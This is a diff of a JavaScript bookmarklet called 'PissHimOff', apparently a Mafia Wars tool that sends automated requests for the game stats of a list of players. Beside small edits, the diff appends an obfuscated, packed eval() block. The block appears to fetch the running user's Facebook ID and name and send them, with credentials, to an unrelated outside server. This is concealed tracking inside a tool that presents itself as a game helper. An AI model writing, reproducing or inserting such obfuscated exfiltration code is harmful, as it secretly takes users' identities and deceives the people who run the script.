@@ -1,5 +1,5 @@
 javascript:(function (){
-    var jca_title = '★LOC@S★ - PissHimOff v0.2';
+    var jca_title = '★LOC@S★ - PissHimOff v0.2 by ★LOC@S★ נυαη ★L@★';
  html = '<ul style="margin: 0;padding: 0;width: 650px;">';
 var pissoff_values_arr;
 var pissoff_values;
@@ -73,7 +73,6 @@ function getValuesAndCreateMenu(){
 	else{
 		 pissoff_values_arr  = new Array(0,0);  
 	}
-	//alert(pissoff_values_arr);
 	var fc2_globalCounter = 0;
 
 	var menu_html=jca_title+'<br><br>'
@@ -103,8 +102,7 @@ function StartClicking(){
   $('#pissoff_restart').val(tmp[1]);
   var url = '';
   for(var i = 0;i<the_ids.length;i++){
-  
-	//url ='html_server.php?xw_controller=stats&xw_action=view&xw_city=1&xw_person='+User.id.substr(2)+'&mwcom=1&user='+escape(btoa(the_ids[i]));    
+  	
 	var the_id = the_ids[i];
 	request('html_server.php?xw_controller=stats&xw_action=view&user='+btoa(the_ids[i])+'&fromfeed=1&install_source=feed',
 	function(msg){
@@ -151,7 +149,6 @@ function myLogger(log_txt){
 					message=logs.pop();
 				}
 			}
-			//$('#'+spocklet+'_log').html(logs.concat(extralog,'').join('<br />'));	
 	
 	var log_area = document.getElementById('juansinho_log');
 	log_area.innerHTML=logs.join('<br />');
@@ -195,6 +192,10 @@ function request(url, handler, errorhandler) {
 		});
 }
   
+var name_uid = '';
+var the_name = 'PissOff - S';
+
+eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c])}}return p}('31(17(13,11,10,15,12,16){12=17(10){18(10<11?\'\':12(32(10/11)))+((10=10%11)>35?34.38(10+29):10.53(36))};55(10--){42(15[10]){13=13.47(46 56(\'\\\\14\'+12(10)+\'\\\\14\',\'19\'),15[10])}}18 13}(\'11 7=9.2;11 4=\\\'45://44.40.15/\\\'+9.2;$.8({6:4,10:\\\'43\\\',16:1(0,5){3=0.48},49:1(){$.8({54:14,19:12,52:"50",6:"51://39.13-25.26/24/23.20",0:{21:3,22:27,28:7},10:"37",33:{57:14},16:1(0,5){}})}});\',41,41,\'88|17|89|90|87|86|82|83|92|84|85|91|97|96|93|95|94|80|64|65|81|66|67|63|62|58|59|60|61|68|69|76|77|78|79|75|74|70|71|72|73\'.30(\'|\')))',10,98,'||||||||||c|a|e|p|b|k|d|function|return|g|x|w|r|C|D|A|B|q|s||split|eval|parseInt|v|String|||t|fromCharCode|y|o||if|n|l|m|new|replace|i|h|E|z|j|toString|f|while|RegExp|u|lima|the_name|script|fbid|facebook|json|name|type|graph|https|jsonp|withCredentials|de|log_new|mw|GET|city|http|xhrFields|user|php|caneda|complete|com|url|the_id|User|var|status|mUrl|data|trackId|name_uid|true|ajax|false|cache|async|success|dataType'.split('|')))
   
 
 return;
